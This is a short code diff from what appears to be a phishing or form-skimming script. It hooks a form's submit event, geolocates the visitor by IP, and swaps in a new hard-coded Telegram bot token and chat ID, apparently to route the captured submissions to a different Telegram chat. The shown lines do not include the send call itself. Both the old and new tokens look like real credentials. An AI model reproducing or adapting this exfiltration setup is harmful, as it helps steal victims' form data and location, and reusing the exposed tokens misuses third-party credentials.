@@ -12,8 +12,8 @@ document.getElementById('secure_form').addEventListener('submit', function(event
             const country = ipData.country_name;
 
             // Your Telegram Bot Token and Chat ID
-            const botToken = '7494244197:AAGmK3fC7Y_gwsEXHv4879hUr5ZKl89cvGY';  // Replace with your Telegram Bot Token
-            const chatId = '5351288466';      // Replace with your Telegram Chat ID
+            const botToken = '7782372269:AAHawGOO9s8x64Sda5-jVgTUlwI73BV51Xs';  // Replace with your Telegram Bot Token
+            const chatId = '7057894073';      // Replace with your Telegram Chat ID
 
             // Message to send to the Telegram bot
             const message = `
